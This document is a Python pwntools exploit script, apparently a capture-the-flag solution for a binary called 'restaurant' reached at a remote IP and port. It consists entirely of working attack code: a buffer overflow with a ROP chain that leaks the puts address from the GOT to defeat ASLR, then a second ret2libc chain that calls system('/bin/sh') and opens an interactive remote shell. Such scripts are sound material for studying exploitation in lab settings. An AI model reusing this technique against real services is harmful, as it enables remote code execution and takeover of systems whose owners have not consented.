from pwn import *

vuln = './restaurant'
elf = context.binary = ELF(vuln, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote('178.62.63.96', 30011)

# Finding LIBC puts address

rop = ROP(elf)
rop.call((rop.find_gadget(["ret"]))[0])
rop.call(elf.plt["puts"], [next(elf.search(b"\n\x00"))])
rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(elf.symbols["fill"])

payload = [b"A"*40, rop.chain()]

payload = b"".join(payload)

p.recvuntil(b"> ")
log.progress("Sending menu choice (1)...")
p.sendline(b"1")

p.recvuntil(b"> ")
log.progress("Sending leak payload...")
p.sendline(payload)

log.progress("Receiving junk ...")
print(p.recvline())
print(p.recvline())
print(p.recvline())

log.success("Leak received !")
leak = u64(p.recvuntil(b"\n").strip().ljust(8, b"\x00"))

log.info("Puts leaked address @ {}".format(hex(leak)))

libc.address = leak - libc.symbols["puts"]

# Calling system

rop = ROP(libc)

rop.call(rop.find_gadget(["ret"]))
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])

payload = [b"A" * 40, rop.chain()]

payload = b"".join(payload)

log.progress("Sending second payload...")
p.sendline(payload)

log.critical("Going interactive")
p.interactive()
